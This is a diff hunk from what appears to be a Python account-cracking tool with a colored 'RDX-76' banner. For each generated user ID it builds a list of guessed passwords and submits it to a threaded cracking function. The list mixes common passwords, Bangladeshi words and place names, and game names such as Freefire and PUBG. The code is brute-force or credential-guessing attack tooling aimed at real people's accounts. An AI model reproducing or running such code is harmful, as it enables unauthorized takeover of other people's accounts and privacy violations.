@@ -11483,7 +11483,7 @@ def Rdx3x():
 		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
 		print ('')
 		for co in user:
-			uid = code+codex+cod+co
+			uid = code+codex+co
 			pwx = [code,codex,code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
 			manshera.submit(rcrackx,uid,pwx,tl)
 	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
